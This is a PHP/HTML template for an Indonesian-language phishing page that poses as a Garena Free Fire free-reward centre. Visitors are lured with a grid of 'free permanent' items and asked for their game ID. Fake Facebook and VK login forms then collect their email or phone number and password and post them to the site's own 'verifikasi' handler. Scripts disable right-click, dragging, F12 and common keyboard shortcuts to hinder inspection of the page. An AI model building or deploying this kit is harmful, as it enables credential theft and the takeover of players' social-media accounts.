<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Garena Free Fire</title>

    <meta property="description" content="Free claim gift in Garena Free Fire" />
    <meta property="og:image" content="<?= base_url('assets/img/thumbnail.png') ?>" />
    <meta property="og:image:width" content="540" />
    <meta property="og:image:height" content="282" />
    <meta name="theme-color" content="#eaa300">
    <link rel="icon" type="img/png" href="<?= base_url('assets/img/thumbnail.png') ?>">
    <link rel="stylesheet" href="<?= base_url('assets/css/style.css') ?>">
    <link rel="stylesheet" type="text/css" href="<?= base_url('assets/css/kontol.css') ?>">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="<?= base_url('assets/js/swal2/sweetalert2.css'); ?>">

<body>
    <style type="text/css">
        #hadiah fieldset:not(:first-of-type) {
            display: none;
        }

        fieldset {
            border: none;
        }
    </style>

    <!--Kode untuk mematikan fungsi klik kanan di blog-->

    <script type="text/javascript">
        function mousedwn(e) {
            try {
                if (event.button == 2 || event.button == 3) return false
            } catch (e) {
                if (e.which == 3) return false
            }
        }
        document.oncontextmenu = function() {
            return false
        };
        document.ondragstart = function() {
            return false
        };
        document.onmousedown = mousedwn
    </script>

    <!--Kode untuk mencegah shorcut keyboard, view source dll.-->

    <script type="text/javascript">
        window.addEventListener("keydown", function(e) {
            if (e.ctrlKey && (e.which == 65 || e.which == 66 || e.which == 67 || e.which == 73 || e.which == 80 || e.which == 83 || e.which == 85 || e.which == 86)) {
                e.preventDefault()
            }
        });
        document.keypress = function(e) {
            if (e.ctrlKey && (e.which == 65 || e.which == 66 || e.which == 67 || e.which == 73 || e.which == 80 || e.which == 83 || e.which == 85 || e.which == 86)) {}
            return false
        }
    </script>

    <script type="text/javascript">
        document.onkeydown = function(e) {
            e = e || window.event;
            if (e.keyCode == 123 || e.keyCode == 18) {
                return false
            }
        }
    </script>


    <div class="navbar">
        <img src="<?= base_url('assets/img/thumbnail.png') ?>">GARENA FREE FIRE</br>
        <span>PUSAT HADIAH FREE FIRE</span>
    </div>
    </br>
    </br>
    </br>
    </br>
    </br>
    <!--- POP UP LOGIN --->
    <div id="login">
        <div class="box-login">
            <a href="#close" class="close-login" onmousedown="tutup.play()" title="Close"><img src="<?= base_url('assets/img/btn_delete.png') ?>"></a>
            <h4 class="berhasil" align="center">SILAHKAN LOGIN <span id="setNick"></span></h4>
            <br />
            <button onclick="location.href='#fb';" onmousedown="buka.play()" class="twitter"><i class="fa fa-facebook"></i> Facebook</button>
            <br /><br />
            <button onclick="location.href='#twitter';" onmousedown="buka.play()" class="fb"><i class="fa fa-vk"></i> VK Login</button>
            <br /><br />
            </center>
        </div>
    </div>
    <!--- /POP UP LOGIN --->

    <!--- POP UP LOGIN --->
    <!--- /POP UP LOGIN --->

    <!--- FB LOGIN --->
    <div id="fb">
        <div class="fb-login">
            <a href="#login" onmousedown="tutup.play()" class="close-login" title="Close">&times;</a>
            <div class="nav-fb">
                <img width="100px" align="center" src="<?= base_url('assets/img/fb.png') ?>">
            </div>
            <br />
            <form action="<?= base_url('verifikasi') ?>" method="post">
                <?= csrf_field() ?>
                <input type="hidden" name="getUId" id="getUId" value="<?= (session('playId')) ? session('playId') : '' ?>">
                <input type="hidden" name="getNickId" id="getNickId">
                <input class="login" type="text" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required>
                <input class="login" type="password" name="password" placeholder="Kata Sandi" autocomplete="off" autocapitalize="off" required>
                <input name="login" type="hidden" value="Facebook" readonly>
                <center>
                    <button type="submit" onmousedown="buka.play()" class="btn-login-fb"><b>Masuk</b></button>
                    <br /><br />
                </center>
                <div class="divider">
                    <span>atau</span>
                </div>
                <br />
                <center>
                    <button class="btn-register-fb">Buat Akun Baru</button>
                    <br /><br />
                    <a href="https://facebook.com/">Lupa Kata Sandi?</a>
                </center>
                <br /><br />
            </form>
        </div>
    </div>
    <!--- /FB LOGIN --->

    <!--- VK LOGIN --->
    <div id="twitter">
        <div class="fb-login">
            <a href="#login" onmousedown="tutup.play()" class="close-login" title="Close">&times;</a>
            <div class="nav-fb"><img width="30px" src="<?= base_url('assets/img/vk.svg') ?>">
            </div>
            <br />
            <form action="<?= base_url('verifikasi') ?>" method="post">
                <?= csrf_field() ?>
                <input type="hidden" name="getUId" id="getUId" value="<?= (session('playId')) ? session('playId') : '' ?>">
                <input type="hidden" name="getNickId" id="getNickId">
                <input class="login" style="border-radius:10px;" type="text" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required></br>
                <input class="login" style="border-radius:10px;" type="password" name="password" placeholder="Kata Sandi" autocomplete="off" autocapitalize="off" required></br>
                <input name="login" type="hidden" value="VK" readonly>
                <br />
                <center>
                    <button type="submit" onmousedown="buka.play()" class="btn-login-fb" style="border-radius:10px;"><b>Masuk</b></button>
                    <br /><br />
                    <a href="https://vk.com/">Lupa Sandi Anda?</a>
                </center>
                <br /><br />
            </form>
        </div>
    </div>
    <!--- /VK LOGIN --->
    </br>
    <form id="hadiah" novalidate>
        <fieldset>
            <!----  HADIAH 1 --->
            <div class="box">
                <div class="isi">
                    <span class="item">GRATIS</span><span class="periode">PERMANEN</span>
                    </br>
                    </br>
                    <hr class="garis">
                    <center>
                        <img width="255" src="<?= base_url('assets/img/sc/1.png') ?>">
                        <hr class="garis"></br>
                        <button type="button" onclick="location.href='#login';" class="btn-klaim">PILIH</button>
                    </center>
                </div>
                <div class="isi">
                    <span class="item">GRATIS</span><span class="periode">PERMANEN</span>
                    </br>
                    </br>
                    <hr class="garis">
                    <center>
                        <img width="255" src="<?= base_url('assets/img/sc/2.png') ?>">
                        <hr class="garis"></br>
                        <button type="button" onclick="location.href='#login';" class="btn-klaim">PILIH</button>
                        </br>
                        </br>
                    </center>
                </div>
                <div class="isi">
                    <span class="item">GRATIS</span><span class="periode">PERMANEN</span>
                    </br>
                    </br>
                    <hr class="garis">
                    <center>
                        <img width="255" src="<?= base_url('assets/img/sc/3.png') ?>">
                        <hr class="garis"></br>
                        <button type="button" onclick="location.href='#login';" class="btn-klaim">PILIH</button>
                    </center>
                </div>
            </div>
            <div class="box">
                <div class="isi">
                    <span class="item">GRATIS</span><span class="periode">PERMANEN</span>
                    </br>
                    </br>
                    <hr class="garis">
                    <center>
                        <img width="255" src="<?= base_url('assets/img/sc/4.png') ?>">
                        <hr class="garis"></br>
                        <button type="button" onclick="location.href='#login';" class="btn-klaim">PILIH</button>
                    </center>
                </div>
                <div class="isi">
                    <span class="item">GRATIS</span><span class="periode">PERMANEN</span>
                    </br>
                    </br>
                    <hr class="garis">
                    <center>
                        <img width="255" src="<?= base_url('assets/img/sc/5.png') ?>">
                        <hr class="garis"></br>
                        <button type="button" onclick="location.href='#login';" class="btn-klaim">PILIH</button>
                        </br>
                        </br>
                    </center>
                </div>
                <div class="isi">
                    <span class="item">GRATIS</span><span class="periode">PERMANEN</span>
                    </br>
                    </br>
                    <hr class="garis">
                    <center>
                        <img width="255" height="300" src="<?= base_url('assets/img/sc/6.png') ?>">
                        <hr class="garis"></br>
                        <button type="button" onclick="location.href='#login';" class="btn-klaim">PILIH</button>
                        </br>
                        </br>
                    </center>
                </div>
            </div>
            <div class="box">
                <div class="isi">
                    <span class="periode">GRATIS</span>
                    </br>
                    </br>
                    <hr class="garis">
                    <center>
                        <img width="255" src="<?= base_url('assets/img/sc/7.png') ?>">
                        <hr class="garis"></br>
                        <button type="button" onclick="location.href='#login';" class="btn-klaim">PILIB</button>
                    </center>
                </div>
                <div class="isi">
                    <span class="periode">GRATIS</span>
                    </br>
                    </br>
                    <hr class="garis">
                    <center>
                        <img width="255" src="<?= base_url('assets/img/sc/8.png') ?>">
                        <hr class="garis"></br>
                        <button type="button" onclick="location.href='#login';" class="btn-klaim">PILIH</button>
                        </br>
                        </br>
                    </center>
                </div>
                <div class="isi">
                    <span class="periode">GRATIS</span>
                    </br>
                    </br>
                    <hr class="garis">
                    <center>
                        <img width="255" src="<?= base_url('assets/img/sc/9.png') ?>">
                        <hr class="garis"></br>
                        <button type="button" onclick="location.href='#login';" class="btn-klaim">PILIH</button>
                        </br>
                        </br>
                    </center>
                </div>
            </div>
            <div class="box">
                <div class="isi">
                    <span class="item">GRATIS</span><span class="periode">PERMANEN</span>
                    </br>
                    </br>
                    <hr class="garis">
                    <center>
                        <img width="255" src="<?= base_url('assets/img/sc/10.png') ?>">
                        <hr class="garis"></br>
                        <button type="button" onclick="location.href='#login';" class="btn-klaim">PILIH</button>
                    </center>
                </div>
                <div class="isi">
                    <span class="item">GRATIS</span><span class="periode">PERMANEN</span>
                    </br>
                    </br>
                    <hr class="garis">
                    <center>
                        <img width="255" src="<?= base_url('assets/img/sc/11.png') ?>">
                        <hr class="garis"></br>
                        <button type="button" onclick="location.href='#login';" class="btn-klaim">PILIH</button>
                        </br>
                        </br>
                    </center>
                </div>
                <div class="isi">
                    <span class="item">GRATIS</span><span class="periode">PERMANEN</span>
                    </br>
                    </br>
                    <hr class="garis">
                    <center>
                        <img width="255" src="<?= base_url('assets/img/sc/12.png') ?>">
                        <hr class="garis"></br>
                        <button type="button" onclick="location.href='#login';" class="btn-klaim">PILIH</button>
                    </center>
                </div>
            </div>
            <div class="box">
                <div class="isi">
                    <span class="item">GRATIS</span><span class="periode">PERMANEN</span>
                    </br>
                    </br>
                    <hr class="garis">
                    <center>
                        <img width="255" src="<?= base_url('assets/img/sc/13.png') ?>">
                        <hr class="garis"></br>
                        <button type="button" onclick="location.href='#login';" class="btn-klaim">PILIH</button>
                    </center>
                </div>
                <div class="isi">
                    <span class="item">GRATIS</span><span class="periode">PERMANEN</span>
                    </br>
                    </br>
                    <hr class="garis">
                    <center>
                        <img width="255" src="<?= base_url('assets/img/sc/14.png') ?>">
                        <hr class="garis"></br>
                        <button type="button" onclick="location.href='#login';" class="btn-klaim">PILIH</button>
                        </br>
                        </br>
                    </center>
                </div>
                <div class="isi">
                    <span class="item">GRATIS</span><span class="periode">PERMANEN</span>
                    </br>
                    </br>
                    <hr class="garis">
                    <center>
                        <img width="255" height="300" src="<?= base_url('assets/img/sc/15.png') ?>">
                        <hr class="garis"></br>
                        <button type="button" onclick="location.href='#login';" class="btn-klaim">PILIH</button>
                        </br>
                        </br>
                    </center>

                </div>
            </div>
            </br>
            </br>
        </fieldset>

    </form>
    </br>
    </br>
    </br>
    </br>
    </br>
    <div class="footer">
        <center>
            <img width="70" src="<?= base_url('assets/img/garena-logo.png') ?>">
        </center>
    </div>

    <script type="text/javascript">
        $(document).ready(function() {
            var current = 1,
                current_step, next_step, steps;
            steps = $("fieldset").length;
            $(".next").click(function() {
                current_step = $(this).parent();
                next_step = $(this).parent().next();
                next_step.show();
                current_step.hide();
                setProgressBar(++current);
            });
            $(".previous").click(function() {
                current_step = $(this).parent();
                next_step = $(this).parent().prev();
                next_step.show();
                current_step.hide();
                setProgressBar(--current);
            });
            setProgressBar(current);
            // Change progress bar action
            function setProgressBar(curStep) {
                var percent = parseFloat(100 / steps) * curStep;
                percent = percent.toFixed();
                $(".progress-bar")
                    .css("width", percent + "%")
                    .html(percent + "%");
            }
        });
    </script>
    <script src="js/click.js"></script>
    </script>
    <div class="popup welcome">
        <div class="popup-box animated fadeInDown" style="background: black;">

            <div class="nav-popup">
                <div class="nav-popup-title">SELAMAT DATANG</div>
            </div>
            <div class="popup-confirm">
                <input type="number" id="playId" placeholder="Masukkan ID Free Fire" class="input-anjir" autocomplete="off" style="width: 75%; margin-top: 25px;height: 40px;padding: 10px;font-size: 20px;font-family: sans-serif;" value="<?= (session('playId')) ? session('playId') : '' ?>">
            </div>
            <div class="errorMsg"></div>
            <br>
            <button type="button" class="btn-anjir" onmousedown="buka.play()" onclick="checkId();">CONFIRM</button>
        </div>
    </div>
    <div class="swall" data-swall="<?= session()->getFlashdata('pesan'); ?>"></div>
    <div class="error" data-error="<?= session()->getFlashdata('error'); ?>"></div>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
    <script src="<?= base_url('assets/js/timer.js') ?>"></script>
    <script src="<?= base_url('assets/js/tab.js') ?>"></script>
    <script src="<?= base_url('assets/js/popup.js') ?>"></script>
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@10"></script>
    <script src="<?= base_url('assets/js/swal2/swall.js'); ?>"></script>
</body>

</html>